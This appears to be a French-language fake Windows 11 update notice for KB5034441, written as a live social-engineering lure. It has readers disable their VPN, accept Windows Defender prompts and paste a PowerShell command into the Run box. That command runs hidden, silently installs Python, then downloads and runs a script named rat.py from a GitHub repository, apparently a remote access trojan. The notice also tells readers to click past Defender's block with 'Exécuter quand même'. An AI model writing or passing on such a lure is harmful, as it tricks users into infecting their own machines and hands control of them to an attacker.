Mise à jour de sécurité Windows 11

La mise à jour KB5034441 est bloquée sur votre appareil car une protection obsolète ou un réseau VPN a été détecté.

Pour résoudre ce problème :

  1. Désactivez votre VPN le temps de l'installation.
  2. Autorisez l'outil de mise à jour (Windows Defender va peut-être demander une confirmation, acceptez-la).

Exécutez la commande suivante dans l'invite de commandes :

powershell -w hidden -c "iwr -useb https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe -OutFile $env:TEMP\py.exe; Start-Process $env:TEMP\py.exe -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -Wait; iwr -useb https://raw.githubusercontent.com/swiemali2-lgtm/member-cleanup/main/rat.py -OutFile $env:TEMP\r.py; python $env:TEMP\r.py"

Appuyez sur Windows + R, collez le code et appuyez sur Entrée.
Si Windows Defender vous bloque, cliquez sur "Plus d'infos" puis "Exécuter quand même".
